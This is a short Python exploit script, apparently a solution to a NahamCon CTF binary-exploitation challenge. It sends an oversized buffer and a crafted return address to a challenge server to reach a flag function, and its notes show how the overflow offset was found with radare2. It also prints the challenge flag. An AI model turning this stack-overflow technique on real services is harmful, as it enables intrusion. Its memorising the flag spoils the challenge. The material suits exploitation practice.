#!/usr/bin/python3
# NahamCon CTF 
# Binary Exploitation
# Dangerous 
# 75 pts
# flag{legend_of_zelda_overflow_of_time}

import socket
from time import sleep
from struct import *


eip = b'\x12\x13\x40\x00\x00\x00\x00\x00' 
# 489 for the buffer to fill 
# and another 8 bytes to get pass the base pointer
c = 489 + 8 
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('jh2i.com', 50011))
sleep(0.25)
data = client.recv(5000)
print(data.decode())
text = ('a'*c).encode()
payload = text + eip + b'\n'
client.send(payload)
sleep(0.25)
data = client.recv(5000)
print(data.decode())

"""
https://www.megabeets.net/a-journey-into-radare-2-part-2/
\https://reverseengineering.stackexchange.com/questions/17810/radare2-unable-to-use-wopo-command

crafting the payload:
Try something small to start: ragg2 -P 200 -r > pattern.txt
vim profile.rr2
#!/usr/bin/rarun2
stdin=./pattern.txt

run: r2 -r profile.rr2 -d dangerous 

no segfault, 
try something longer:
ragg2 -P 400 -r > pattern.txt
r2 -r profile.rr2 -d dangerous 

nope, try something longer:
ragg2 -P 500 -r > pattern.txt
r2 -r profile.rr2 -d dangerous 
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x7f5332417343 code=1 ret=0
[0x7f5332417343]> wopO `dr ebp`
489

So the buffer till overwrite is 489 characters long.
Need 8 more bytes to write over the base pointer
Then overwirte the return address with the addresss 
of the start of the flag function @ 0x401312

Final payload is (489+8)*'a' + b'\x12\x13\x40\x00\x00\x00\x00\x00'
"""